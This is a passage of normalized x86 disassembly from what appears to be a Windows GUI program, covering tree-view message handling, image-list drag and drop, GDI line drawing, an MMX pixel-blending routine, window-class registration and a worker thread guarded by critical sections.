je r-xdata
mov eax [ rw-data ]
lea edx [ esi + 0x1 ]
cmp eax edx
jne r-xdata
push 0xffff0002
push edi
push ebx
mov [ rw-data ] edi
call sub_41ccb0
mov edx [ rw-data ]
add esp 0xc
push ebx
push 0x0
push 0x1101
push edx
mov edi eax
call esi
mov eax [ rw-data ]
push 0x0
push 0x8
push 0x110b
push eax
call esi
mov ecx [ rw-data ]
push edi
push 0x9
push 0x110b
push ecx
call esi
call sub_41c6f0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edi 0xffff0000
mov ecx [ rw-data ]
push eax
push 0x3
push 0x110a
push ecx
call esi
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
test edi edi
jne r-xdata
cmp ebx 0x2
jne r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esi ]
push edx
push 0x0
push 0x110e
push eax
call ebp
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
cmp [ esi + 0x18 ] 0x10
jb r-xdata
movzx ecx [ esi + 0xc ]
add ecx 0xfffffff7
cmp ecx 0x68
ja r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esi ]
push eax
push 0x9
push 0x110b
push ecx
call edi
mov edx [ esp + 0x2c ]
mov eax [ esi ]
push edx
push 0x0
push 0x1112
push eax
call edi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov edx [ esi + 0x30 ]
mov eax [ edx + 0x1c ]
push eax
lea ecx [ esp + 0xf8 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
jmp r-xdata
mov [ rw-data ] ebp
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
cmp [ rw-data ] ebx
jne r-xdata
mov edi [ esp + 0x34 ]
cmp edi 0x4
jl r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp ecx [ esp + 0x34 ]
je r-xdata
jmp r-xdata
cmp eax ecx
je r-xdata
xor eax eax
cmp esi 0x2
mov [ rw-data ] eax
mov [ rw-data ] eax
jne r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x34 ] esp
push r--data
call sub_4024d0
push 0xffff0000
call sub_41c7b0
add esp 0x20
jmp r-xdata
mov eax [ rw-data ]
shl eax 0x4
push 0x0
lea ecx [ esp + eax + 0x54 ]
push ecx
push ebp
mov [ rw-data ] 0x0
call [ InvalidateRect@IAT ]
push ebp
call [ UpdateWindow@IAT ]
call [ ReleaseCapture@IAT ]
cmp edi 0x1
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp ebx 0x3
jne r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ esi ]
push ecx
push 0x0
push 0x110e
push edx
mov [ rw-data ] 0x1
call ebp
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
push esi
mov [ esi + 0x4 ] 0x0
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
movzx edx [ ecx + lookup_table_41ea24 ]
jmp [ edx * 4 + jump_table_41ea08 ]
mov eax [ esi ]
mov ecx [ esp + 0x2c ]
lea edx [ esp + 0x48 ]
push edx
push ebx
push 0x1104
push eax
mov [ esp + 0x58 ] ecx
call edi
mov eax [ esp + 0x4c ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
mov ebx [ esp + 0x48 ]
sub ecx eax
mov eax [ rw-data ]
push ecx
sub edx ebx
add edx 0x13
push edx
push 0x0
push eax
call [ ImageList_BeginDrag@IAT ]
mov ecx [ esi + 0x64 ]
mov edx [ esi + 0x60 ]
mov eax [ esi ]
push ecx
push edx
push eax
call [ ImageList_DragEnter@IAT ]
mov ecx [ esp + 0x210 ]
push ecx
mov [ rw-data ] 0x1
call [ SetCapture@IAT ]
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ecx [ esi ]
mov edi [ SendMessageA@IAT ]
lea eax [ esp + 0xf4 ]
push eax
push 0x0
push 0xc
push 0x0
push 0x0
push 0x110f
push ecx
call edi
push eax
call edi
mov edx [ esi ]
push 0xffffffff
push 0x0
push 0xb1
push 0x0
push 0x0
push 0x110f
push edx
call edi
push eax
call edi
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
mov ebx [ esp + 0x18 ]
cmp [ ebx ] 0x0
je r-xdata
push edi
call j_sub_4b692d
mov ecx [ esi + 0x30 ]
add esp 0x4
mov [ ecx + 0x1c ] eax
mov edx [ esi ]
lea eax [ esi + 0xc ]
mov esi [ SendMessageA@IAT ]
push eax
push ebp
push 0x110d
push edx
mov [ eax ] 0x14
call esi
mov edx [ rw-data ]
mov eax [ rw-data ]
lea ecx [ esp + 0x20 ]
push ecx
push ebp
push 0x1115
push edx
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] sub_41c4d0
mov [ esp + 0x38 ] ebp
call esi
jmp r-xdata
mov ebp [ esp + edi * 4 + 0xa4 ]
lea ecx [ esp + 0x20 ]
push ecx
push ebp
call [ lstrlenA@IAT ]
push eax
push ebp
push esi
call [ GetTextExtentPoint32A@IAT ]
mov ecx [ rw-data ]
lea eax [ edi + 0x1 ]
cmp ecx eax
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x34 ] eax
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
push esi
call ebx
mov edi [ MoveToEx@IAT ]
push 0x0
push 0x0
push 0x0
push esi
call edi
mov edx [ esp + 0x50 ]
mov ebp [ LineTo@IAT ]
push 0x0
push edx
push esi
call ebp
mov eax [ esp + 0x14 ]
push eax
push esi
call ebx
push 0x0
push 0x13
push 0x0
push esi
call edi
mov ecx [ esp + 0x50 ]
push 0x13
push ecx
push esi
call ebp
mov edx [ esp + 0x58 ]
push edx
push esi
call ebx
mov eax [ esp + 0xa0 ]
push eax
push esi
call ebx
mov ecx [ esp + 0x5c ]
push ecx
push esi
call ebx
mov edx [ esp + 0x18 ]
mov esi [ DeleteObject@IAT ]
push edx
call esi
mov eax [ esp + 0x10 ]
push eax
call esi
mov ecx [ esp + 0x14 ]
push ecx
call esi
mov eax [ esp + 0x210 ]
lea edx [ esp + 0xb4 ]
push edx
push eax
call [ EndPaint@IAT ]
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
mov [ esp + 0x1c ] 0x1
mov [ esp + 0x30 ] 0x0
cmp edi 0x2
je r-xdata
cmp esi 0x3
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
sete al
mov [ rw-data ] eax
jmp r-xdata
mov eax [ rw-data ]
lea esi [ edi + 0x1 ]
cmp eax esi
je r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x1105
push ecx
call [ SendMessageA@IAT ]
mov ecx rw-data
call sub_4010f0
jmp r-xdata
cmp ebx 0x4
jne r-xdata
mov eax [ esp + 0x2c ]
push eax
call sub_41c190
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
mov eax [ rw-data ]
push eax
call [ SetFocus@IAT ]
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
mov ecx [ esi ]
push eax
push 0x0
push 0x110e
push ecx
call edi
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
mov edx [ esi ]
push eax
push 0x0
push 0x110e
push edx
mov [ rw-data ] ebx
call edi
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
mov ecx [ esi ]
mov [ esp + 0x64 ] eax
lea eax [ esp + 0x60 ]
push eax
push 0x0
push 0x110c
push ecx
mov [ esp + 0x70 ] 0x14
call edi
test eax eax
je r-xdata
push eax
call sub_41c9f0
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
push eax
lea edx [ esp + 0xf8 ]
push edx
call [ lstrcpyA@IAT ]
cmp [ edi ] 0x0
jne r-xdata
mov al [ edi ]
mov cl al
xor cl 0x20
add cl 0x5f
cmp cl 0x3b
ja r-xdata
call sub_41c6f0
cmp [ rw-data ] ebp
jne r-xdata
cmp edi 0x3
je r-xdata
mov eax [ esp + 0x210 ]
push 0x0
lea edx [ esp + 0x3c ]
push edx
push eax
call [ InvalidateRect@IAT ]
mov ecx [ esp + 0x210 ]
push ecx
call [ UpdateWindow@IAT ]
test esi esi
jne r-xdata
mov edx [ rw-data ]
xor ecx ecx
test edx edx
sete cl
mov [ rw-data ] ecx
sub esp 0x1c
mov [ esp + 0x34 ] esp
mov ecx esp
push r--data
call sub_4024d0
push 0xffff0000
call sub_41c7b0
add esp 0x20
mov edx [ esp + 0x30 ]
mov bl 0x1
push ebp
call [ SetCapture@IAT ]
mov eax [ rw-data ]
cmp eax 0x3
mov ecx esi
mov [ rw-data ] ecx
jl r-xdata
test eax eax
je r-xdata
cmp ebx 0x5
jne r-xdata
mov ecx [ esp + 0x2c ]
push ecx
call sub_41c190
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1fc
retn 0x10
mov edx [ esp + 0x84 ]
fild [ edx + 0x20 ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov [ rw-data ] eax
mov eax [ esp + 0x88 ]
fild [ eax + 0x24 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov [ rw-data ] eax
mov eax [ rw-data ]
push eax
push ebx
jmp r-xdata
mov ecx [ esi + 0x30 ]
push ebx
call sub_402510
mov ecx [ esi ]
lea eax [ esi + 0xc ]
push eax
push ebp
push 0x110d
push ecx
call [ SendMessageA@IAT ]
cmp al 0x5c
je r-xdata
add edi 0x2
jmp r-xdata
sub esp 0x1c
mov ecx esp
mov [ esp + 0x34 ] esp
push r--data
call sub_4024d0
push 0xffff0000
call sub_41c7b0
add esp 0x20
cmp [ rw-data ] ebp
je r-xdata
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x30 ] 0x1
jmp r-xdata
cmp esi ebp
je r-xdata
call sub_41ca30
jmp r-xdata
shl eax 0x4
push 0x0
lea edx [ esp + eax + 0x54 ]
push edx
push ebp
call [ InvalidateRect@IAT ]
mov ecx [ rw-data ]
cmp [ rw-data ] eax
jne r-xdata
mov edx [ esp + 0x84 ]
fild [ edx + 0x20 ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov [ rw-data ] eax
mov eax [ esp + 0x88 ]
fild [ eax + 0x24 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov [ rw-data ] eax
mov eax [ rw-data ]
push eax
push 0x1
mov ecx [ esp + 0x90 ]
mov edx [ ecx + 0x1c ]
mov esi [ rw-data ]
dec edx
push 0x84
mov [ rw-data ] edx
call sub_48a5f0
add esp 0x10
mov [ rw-data ] esi
mov edx [ esp + 0x210 ]
push 0x10
push r--data
push r--data
push edx
call [ MessageBoxA@IAT ]
cmp al 0x2f
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
push 0x0
push 0x2
lea edi [ ebp + 0x27 ]
push edi
push esi
call [ MoveToEx@IAT ]
mov edx [ esp + 0x1c ]
mov eax [ esp + edx * 4 + 0x10 ]
push eax
push esi
call ebx
inc ebp
push 0x2
push ebp
mov [ esp + 0x24 ] ebp
mov ebp [ LineTo@IAT ]
push esi
call ebp
mov ecx [ esp + 0x1c ]
push 0x12
push ecx
push esi
call ebp
mov edx [ esp + 0x30 ]
mov eax [ esp + edx * 4 + 0x10 ]
push eax
push esi
call ebx
push 0x12
push edi
push esi
call ebp
push 0x2
push edi
push esi
call ebp
mov edx [ esp + 0x210 ]
push ebp
push r--data
push r--data
push edx
call [ MessageBoxA@IAT ]
cmp eax ebp
jne r-xdata
shl ecx 0x4
push 0x0
lea eax [ esp + ecx + 0x54 ]
push eax
push ebp
call [ InvalidateRect@IAT ]
cmp [ rw-data ] ecx
jne r-xdata
cmp ecx 0x3
jl r-xdata
cmp al 0x3a
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
push 0xffff0000
push 0x0
push 0x1101
push eax
call [ SendMessageA@IAT ]
call sub_41c6f0
push ebp
call [ UpdateWindow@IAT ]
cmp al 0x2a
je r-xdata
cmp al 0x3f
je r-xdata
cmp al 0x22
je r-xdata
cmp al 0x3c
je r-xdata
cmp al 0x3e
je r-xdata
cmp al 0x7c
je r-xdata
inc edi
sub_41eab0
sub esp 0x30
push ebx
mov ebx [ esp + 0x38 ]
push esi
push edi
push 0xfffffffa
push ebx
call [ GetWindowLongA@IAT ]
xor esi esi
push 0x7f00
mov edi eax
push esi
mov [ esp + 0x28 ] edi
mov [ esp + 0x3c ] r--data
mov [ esp + 0x18 ] esi
mov [ esp + 0x14 ] 0x30
mov [ esp + 0x2c ] esi
mov [ esp + 0x40 ] esi
call [ LoadCursorA@IAT ]
mov [ esp + 0x28 ] eax
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0x34 ] esi
mov [ esp + 0x1c ] esi
mov [ esp + 0x20 ] esi
mov [ esp + 0x30 ] esi
mov [ esp + 0x18 ] sub_41d7f0
call [ RegisterClassExA@IAT ]
test ax ax
jne r-xdata
push esi
push edi
push esi
push ebx
push esi
push esi
push esi
push esi
push 0x52800000
push esi
push r--data
push esi
call [ CreateWindowExA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x30
retn
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x30
retn
sub_41eb80
sub esp 0x14
mov eax [ ecx + 0x8 ]
push ebx
push ebp
push esi
mov esi [ ecx ]
mov [ esp + 0xc ] eax
sub eax esi
xor edx edx
cmp eax edx
push edi
mov [ esp + 0x18 ] eax
jle r-xdata
mov eax [ esp + 0x28 ]
pop edi
pop esi
pop ebp
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x4 ] edx
mov [ eax ] edx
pop ebx
add esp 0x14
retn 0x8
mov eax [ ecx + 0xc ]
mov ebx [ ecx + 0x4 ]
mov [ esp + 0x14 ] eax
sub eax ebx
cmp eax edx
mov [ esp + 0x1c ] eax
jle r-xdata
mov eax [ esp + 0x2c ]
mov edi [ eax + 0x8 ]
mov edx [ eax ]
mov ebp edi
sub ebp edx
test ebp ebp
mov [ esp + 0x2c ] ebp
jle r-xdata
xor edx edx
mov ecx [ eax + 0xc ]
mov eax [ eax + 0x4 ]
mov ebp ecx
sub ebp eax
test ebp ebp
mov [ esp + 0x20 ] ebp
jle r-xdata
cmp esi edx
jge r-xdata
mov ebp esi
mov edi [ esp + 0x10 ]
mov ebp edx
jmp r-xdata
mov esi ebx
mov ecx [ esp + 0x14 ]
mov esi eax
jmp r-xdata
cmp ebx eax
jge r-xdata
mov eax [ esp + 0x28 ]
pop edi
pop esi
pop ebp
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
pop ebx
add esp 0x14
retn 0x8
mov edx ecx
sub edx esi
cmp edx ebx
jle r-xdata
mov eax edi
sub eax ebp
xor ebx ebx
cmp eax ebx
jle r-xdata
mov ebx [ esp + 0x18 ]
cmp eax ebx
jle r-xdata
mov eax [ esp + 0x1c ]
cmp edx eax
jle r-xdata
lea edi [ ebx + ebp ]
xor edx edx
mov eax edi
sub eax ebp
test eax eax
setle dl
dec edx
and eax edx
mov edx [ esp + 0x2c ]
cmp eax edx
jle r-xdata
lea ecx [ eax + esi ]
xor edx edx
mov eax ecx
sub eax esi
test eax eax
setle dl
dec edx
and eax edx
mov edx [ esp + 0x20 ]
cmp eax edx
jle r-xdata
lea edi [ edx + ebp ]
mov eax [ esp + 0x28 ]
mov edx eax
mov [ edx ] ebp
mov [ edx + 0x4 ] esi
mov [ edx + 0x8 ] edi
pop edi
pop esi
pop ebp
mov [ edx + 0xc ] ecx
pop ebx
add esp 0x14
retn 0x8
lea ecx [ edx + esi ]
sub_41ecb0
mov eax [ esp + 0x10 ]
sub esp 0x20
push esi
sub eax [ esp + 0x2c ]
test eax eax
jle r-xdata
mov esi [ ecx ]
mov eax [ esp + 0x28 ]
mov edx eax
mov [ edx ] esi
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ecx + 0x8 ]
mov [ edx + 0x8 ] esi
mov ecx [ ecx + 0xc ]
mov [ edx + 0xc ] ecx
pop esi
add esp 0x20
retn 0x14
mov edx [ esp + 0x38 ]
sub edx [ esp + 0x30 ]
test edx edx
jg r-xdata
mov esi [ ecx + 0x4 ]
push ebx
mov ebx [ ecx + 0x8 ]
push ebp
mov ebp [ ecx + 0xc ]
push edi
mov edi [ ecx ]
lea edx [ esp + 0x38 ]
push edx
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] edi
mov [ esp + 0x1c ] esi
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebp
call sub_41eb80
mov eax [ esp + 0x3c ]
cmp esi eax
jne r-xdata
cmp edi [ esp + 0x38 ]
jne r-xdata
cmp ebp [ esp + 0x44 ]
jne r-xdata
mov eax [ esp + 0x34 ]
pop edi
xor ecx ecx
pop ebp
pop ebx
mov [ eax + 0xc ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
pop esi
add esp 0x20
retn 0x14
cmp ebx [ esp + 0x40 ]
jne r-xdata
cmp edi [ esp + 0x38 ]
mov eax [ esp + 0x34 ]
mov [ eax + 0xc ] ebp
mov [ eax + 0x4 ] esi
jge r-xdata
cmp esi eax
mov eax [ esp + 0x34 ]
mov [ eax + 0x8 ] ebx
mov [ eax ] edi
jge r-xdata
mov edx [ esp + 0x28 ]
pop edi
pop ebp
mov [ eax + 0x8 ] ebx
pop ebx
mov [ eax ] edx
pop esi
add esp 0x20
retn 0x14
mov ecx [ esp + 0x20 ]
mov [ eax ] edi
pop edi
pop ebp
pop ebx
mov [ eax + 0x8 ] ecx
pop esi
add esp 0x20
retn 0x14
mov edx [ esp + 0x2c ]
pop edi
mov [ eax + 0xc ] ebp
pop ebp
pop ebx
mov [ eax + 0x4 ] edx
pop esi
add esp 0x20
retn 0x14
mov ecx [ esp + 0x24 ]
pop edi
pop ebp
pop ebx
mov [ eax + 0x4 ] esi
mov [ eax + 0xc ] ecx
pop esi
add esp 0x20
retn 0x14
sub_41edc0
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi 0x100
sub esi edi
cmp eax 0xffffffff
mov [ ebp - 0x4 ] esi
jne r-xdata
test al 0x1
je r-xdata
lea eax [ ebp - 0x50 ]
push eax
call sub_4a9c60
mov eax [ ebp - 0x18 ]
add esp 0x4
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
shr eax 0x2
test eax eax
mov [ ebp - 0x4 ] eax
jbe r-xdata
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
shr eax 0x3
movd mm4 [ ebp + 0x18 ]
punpcklwd mm4 mm4
punpckldq mm4 mm4
movd mm5 [ ebp - 0x4 ]
punpcklwd mm5 mm5
punpckldq mm5 mm5
pxor mm6 mm6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
lea eax [ ebx + 0x2 ]
mov edx ecx
sub edx ebx
mov ebx [ ebp + 0x8 ]
sub ebx ecx
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
movq mmx0 [ ecx ]
movq mmx1 [ edx ]
movq mm2 mmx0
movq mm3 mmx1
punpckhbw mmx0 mm6
punpckhbw mmx1 mm6
punpcklbw mm2 mm6
punpcklbw mm3 mm6
pmullw mmx0 mm4
pmullw mmx1 mm5
pmullw mm2 mm4
pmullw mm3 mm5
paddw mmx0 mmx1
paddw mm2 mm3
psrlw mmx0 0x8
psrlw mm2 0x8
packuswb mm2 mmx0
movq [ ebx ] mm2
add ecx 0x8
add edx 0x8
add ebx 0x8
dec eax
jne r-xdata
emms
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx edx [ edx + eax ]
movzx ebx [ eax ]
imul edx esi
imul ebx edi
add edx ebx
movzx ebx [ eax - 0x1 ]
imul ebx edi
movzx edi [ ecx + 0x1 ]
imul edi esi
add ebx edi
movzx edi [ eax - 0x2 ]
imul edi [ ebp + 0x18 ]
shl edx 0x8
and edx 0xffff00ff
or edx ebx
movzx ebx [ ecx ]
imul ebx esi
add edi ebx
and edx 0xffffff00
shr edi 0x8
or edx edi
mov edi [ ebp - 0xc ]
mov [ edi + ecx ] edx
mov edx [ ebp - 0x4 ]
add ecx 0x4
add eax 0x4
dec edx
mov [ ebp - 0x4 ] edx
jne r-xdata
mov edx [ ebp - 0x8 ]
mov edi [ ebp + 0x18 ]
sub_41ef10
sub esp 0x18
push esi
lea eax [ esp + 0x4 ]
push eax
call [ GetCursorPos@IAT ]
mov esi [ esp + 0x28 ]
mov eax [ esp + 0x4 ]
cmp [ esi ] eax
jg r-xdata
mov eax 0x1
pop esi
add esp 0x18
retn 0x10
cmp eax [ esi + 0x8 ]
jge r-xdata
mov eax [ esp + 0x8 ]
cmp [ esi + 0x4 ] eax
jg r-xdata
cmp eax [ esi + 0xc ]
jge r-xdata
mov ecx [ esp + 0x2c ]
push ebx
push ebp
mov edx ecx
mov ebp [ edx ]
mov eax [ edx + 0x4 ]
mov ebx [ edx + 0x8 ]
mov edx [ edx + 0xc ]
mov [ esp + 0x18 ] eax
mov eax [ ecx ]
push edi
mov edi [ ecx + 0x8 ]
add eax edi
mov [ esp + 0x24 ] edx
cdq
sub eax edx
sar eax 0x1
add eax 0xffffff00
mov [ ecx ] eax
mov edx [ esi + 0x8 ]
add eax 0x200
cmp eax edx
jle r-xdata
mov eax [ esi ]
cmp [ ecx ] eax
jge r-xdata
add edx 0xfffffe00
mov [ ecx ] edx
mov eax [ ecx + 0x4 ]
mov edx [ esi + 0x4 ]
add eax 0xfffffecc
cmp eax edx
jge r-xdata
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov eax [ ecx + 0xc ]
add eax 0x8
mov [ ecx + 0x4 ] eax
mov edx [ esi + 0xc ]
add eax 0x12c
cmp eax edx
jle r-xdata
mov eax [ ecx + 0x4 ]
mov edx [ ecx ]
pop edi
pop ebp
add eax 0x12c
add edx 0x200
pop ebx
mov [ ecx + 0xc ] eax
mov [ ecx + 0x8 ] edx
xor eax eax
pop esi
add esp 0x18
retn 0x10
mov eax [ esp + 0x10 ]
cmp [ ecx ] eax
mov [ ecx + 0x4 ] 0x0
jg r-xdata
cmp eax edi
jge r-xdata
mov edx [ esi + 0x8 ]
lea eax [ ebx + 0x208 ]
cmp eax edx
jle r-xdata
add ebx 0x8
mov [ ecx ] ebx
jmp r-xdata
add ebp 0xfffffdf8
mov [ ecx ] ebp
jmp r-xdata
sub_41f020
mov eax [ ecx + 0x14 ]
test eax eax
jne r-xdata
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
or eax 0xffffffff
retn
add ecx 0x4
push ecx
call j_sub_4b692d
add esp 0x4
retn
mov ecx [ ecx + 0x4 ]
push ecx
call j_sub_4b692d
add esp 0x4
retn
sub_41f050
push 0xffffffff
push sub_4bfb1b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4b8
mov al [ rw-data ]
push ebx
push ebp
xor ebx ebx
cmp al bl
push esi
push edi
mov [ esp + 0x18 ] ebx
jne r-xdata
mov ecx [ esp + 0x4d8 ]
push ebx
push ebx
push 0x1406
push ecx
call [ PostMessageA@IAT ]
push ebx
call [ ExitThread@IAT ]
push rw-data
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] bl
jne r-xdata
push 0x28
call [ Sleep@IAT ]
push rw-data
call [ LeaveCriticalSection@IAT ]
mov ebp [ rw-data ]
cmp ebp ebx
je r-xdata
cmp [ esp + 0x18 ] ebp
je r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
cmp [ ebp + 0x2ec ] ebx
jne r-xdata
cmp [ ebp + 0x2f0 ] 0x10
jb r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp + 0x2dc ]
mov eax [ ebp + 0x2dc ]
jmp r-xdata
dec eax
cmp eax ebx
mov [ esp + 0x10 ] eax
jge r-xdata
cmp [ ebp + 0x34 ] 0x10
jb r-xdata
mov [ esp + 0x10 ] ebx
push eax
call j_sub_4b692d
add esp 0x4
lea esi [ ebp + 0x20 ]
mov esi [ ebp + 0x20 ]
jmp r-xdata
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax edi
push eax
push esi
call sub_401e80
call sub_405090
mov esi 0xf
add esp 0x1c
mov [ esp + 0x48 ] esi
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
mov [ esp + 0x9c ] esi
mov [ esp + 0x98 ] ebx
mov [ esp + 0x88 ] bl
cmp eax 0x1
mov [ esp + 0x4d0 ] ebx
jne r-xdata
sub esp 0x1c
mov ecx esp
mov eax esi
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] ebx
mov [ esp + 0x48 ] esp
mov [ ecx + 0x4 ] bl
lea edi [ eax + 0x1 ]
nop
mov eax [ ebp + 0x34 ]
mov edi 0x10
cmp eax edi
jb r-xdata
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ ebp + 0x20 ]
mov eax [ ebp + 0x20 ]
jmp r-xdata
mov eax [ ebp + 0x34 ]
mov edi 0x10
cmp eax edi
jb r-xdata
mov [ esp + 0x18 ] ebp
jmp r-xdata
push rw-data
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] bl
je r-xdata
push ebx
push ebx
push ebx
lea ecx [ esp + 0x3c ]
push ecx
mov ecx [ esp + 0x20 ]
push ebx
lea edx [ esp + 0x28 ]
push edx
push ecx
push eax
call sub_409a30
add esp 0x20
test eax eax
jl r-xdata
lea eax [ ebp + 0x20 ]
mov eax [ ebp + 0x20 ]
jmp r-xdata
mov eax [ esp + 0x9c ]
mov edi 0x10
cmp eax edi
mov [ esp + 0x4d0 ] 0xffffffff
jb r-xdata
mov esi [ LeaveCriticalSection@IAT ]
push rw-data
call esi
cmp [ esp + 0x48 ] edi
mov eax [ esp + 0x34 ]
jae r-xdata
mov edx [ esp + 0x14 ]
push edx
call [ LocalFree@IAT ]
jmp r-xdata
mov [ esp + 0x14 ] ebx
cmp [ ebp + 0x34 ] edi
jb r-xdata
push eax
call sub_405ce0
add esp 0x4
cmp eax 0x1
jne r-xdata
cmp [ esp + 0x48 ] edi
mov [ esp + 0x9c ] esi
mov [ esp + 0x98 ] ebx
mov [ esp + 0x88 ] bl
jb r-xdata
mov edx [ esp + 0x88 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
push ebx
push ebx
push 0x1
push ebx
push 0x1
push eax
call sub_439280
add esp 0x4
push eax
mov eax [ esp + 0x2c ]
push eax
push ebx
mov ecx rw-data
call sub_4402e0
jmp r-xdata
lea eax [ esp + 0x34 ]
push rw-data
call [ LeaveCriticalSection@IAT ]
lea eax [ ebp + 0x20 ]
mov eax [ ebp + 0x20 ]
jmp r-xdata
mov [ esp + 0x48 ] esi
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
jmp r-xdata
mov eax [ esp + 0x34 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp eax ebx
je r-xdata
cmp [ rw-data ] bl
je r-xdata
push rw-data
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] bl
je r-xdata
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x28 ]
push edx
lea ecx [ esp + 0x30 ]
push ecx
lea edx [ esp + 0xac ]
push edx
mov edx [ esp + 0x20 ]
lea ecx [ esp + 0x2c ]
push ecx
push 0x3f800000
push edx
push eax
call sub_405d40
add esp 0x20
cmp eax 0x1
jne r-xdata
mov esi 0xf
push rw-data
mov [ esp + 0x1c ] ebp
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] bl
je r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
push ebx
push ecx
push edx
movzx edx [ esp + 0xba ]
push eax
mov eax [ esp + 0x20 ]
sub esp 0x428
mov edi esp
mov ecx 0x10a
lea esi [ esp + 0x4d8 ]
[ edi ] [ esi ]
mov ecx [ esp + 0x454 ]
push ecx
or edx 0x10000000
push edx
push eax
mov ecx rw-data
call sub_43e840
mov esi [ LeaveCriticalSection@IAT ]
mov eax [ esp + 0x1c ]
push eax
call [ DeleteObject@IAT ]
cmp ebp [ rw-data ]
jne r-xdata
push rw-data
call esi
jmp r-xdata
push rw-data
call esi
mov ecx [ esp + 0x4d8 ]
push ebx
push ebx
push 0x1403
push ecx
call [ PostMessageA@IAT ]
lea ecx [ esp + 0x30 ]
mov [ esp + 0x4d0 ] 0xffffffff
call sub_401a90
jmp r-xdata
sub_41f420
sub esp 0x12c
push ebx
mov ebx [ esp + 0x13c ]
push ebp
mov ebp [ esp + 0x138 ]
push esi
